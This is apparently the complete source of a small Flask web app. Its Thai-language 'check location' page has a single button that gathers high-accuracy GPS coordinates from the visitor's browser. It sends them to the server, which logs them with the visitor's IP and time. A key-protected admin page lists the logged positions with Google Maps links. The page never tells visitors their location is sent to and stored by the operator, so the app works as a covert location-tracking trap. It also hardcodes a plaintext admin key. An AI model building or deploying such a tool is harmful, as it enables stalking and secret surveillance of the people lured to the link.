from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)
ADMIN_KEY = "0949205717As"

@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Location System</title>

<style>
body {
    margin:0;
    font-family: Arial;
    background: linear-gradient(180deg,#0f0f1f,#000);
    color:white;
    text-align:center;
    padding-top:80px;
}
.box {
    background: rgba(0,0,0,0.6);
    padding:40px;
    border-radius:20px;
    width:360px;
    margin:auto;
    box-shadow:0 0 25px #6c5ce7;
}
button {
    padding:15px 30px;
    background:#6c5ce7;
    border:none;
    border-radius:10px;
    color:white;
    font-size:18px;
    cursor:pointer;
}
button:hover {background:#a29bfe;}
</style>
</head>

<body>

<div class="box">
<h2>📍 ตรวจสอบตำแหน่ง</h2>
<p>กดเพื่อเริ่มระบบ</p>
<button onclick="start()">เริ่ม</button>
<p id="status"></p>
</div>

<script>
let results = [];
let tries = 0;
let MAX = 10;

function start(){
    document.getElementById("status").innerText = "กำลังค้นหา...";

    for(let i=0;i<MAX;i++){
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy:true,
            timeout:8000,
            maximumAge:0
        });
    }
}

function success(pos){
    tries++;

    let data = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
    };

    // 🔥 ไม่คัดทิ้งแล้ว → เก็บหมด
    results.push(data);

    document.getElementById("status").innerText =
        "กำลังวิเคราะห์ ("+tries+"/"+MAX+") | "+Math.round(data.acc)+"m";

    if(tries >= MAX){
        finalize();
    }
}

function finalize(){
    if(results.length === 0){
        document.getElementById("status").innerText = "ไม่สามารถหาตำแหน่ง";
        return;
    }

    // 🎯 เลือกค่าที่แม่นสุด
    results.sort((a,b)=>a.acc - b.acc);
    let best = results[0];

    let level = "ต่ำ";
    if(best.acc < 50) level = "แม่นมาก";
    else if(best.acc < 150) level = "แม่นปานกลาง";

    document.getElementById("status").innerText =
        "สำเร็จ ("+Math.round(best.acc)+"m) - " + level;

    fetch("/location", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(best)
    }).then(()=>{
        window.location="/done";
    });
}

function error(){
    document.getElementById("status").innerText =
        "กรุณาเปิด Location + WiFi";
}
</script>

</body>
</html>
"""

@app.route("/location", methods=["POST"])
def location():
    d = request.get_json()
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt","a") as f:
        f.write(f"{time}|{ip}|{d['lat']}|{d['lon']}|{d['acc']}\n")

    return jsonify({"ok":True})

@app.route("/done")
def done():
    return """
    <body style="background:black;color:white;text-align:center;padding:100px">
    <h1>📍 บันทึกตำแหน่งแล้ว</h1>
    </body>
    """

@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    try:
        with open("log.txt") as f:
            for line in f:
                t,ip,lat,lon,acc = line.strip().split("|")
                link = f"https://www.google.com/maps?q={lat},{lon}"
                rows += f"<tr><td>{t}</td><td>{ip}</td><td>{lat},{lon}</td><td>{acc}m</td><td><a href='{link}' target='_blank'>Map</a></td></tr>"
    except:
        rows = "<tr><td colspan=5>No data</td></tr>"

    return f"""
    <body style="background:#111;color:white">
    <h1>📊 ADMIN PANEL</h1>
    <table border=1 width=100%>
    <tr><th>Time</th><th>IP</th><th>Location</th><th>Accuracy</th><th>Map</th></tr>
    {rows}
    </table>
    </body>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",10000)))
